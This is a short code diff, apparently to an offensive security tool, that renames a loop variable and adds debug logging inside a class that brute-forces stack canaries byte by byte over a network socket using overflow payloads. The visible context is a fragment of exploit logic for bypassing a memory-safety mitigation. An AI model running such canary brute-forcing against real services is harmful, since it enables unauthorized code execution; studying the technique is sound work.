@@ -274,7 +274,7 @@ class StackCanaryBypass(MitigationBypassBase):
         # First byte of canary is always null
         canary_bytes.append(0)
 
-        for byte_idx in range(1, canary_size):
+        for _byte_idx in range(1, canary_size):
             for test_byte in range(256):
                 # Build payload with partial canary overwrite
                 payload = b"A" * buffer_size
@@ -809,6 +809,9 @@ class StackCanaryBypass(MitigationBypassBase):
                 try:
                     response = sock.recv(1024)
                     sock.close()
+                    # Log response for debugging canary bypass attempts
+                    if response:
+                        self.logger.debug(f"Received {len(response)} bytes in canary test response")
                     return True
                 except socket.timeout:
                     sock.close()
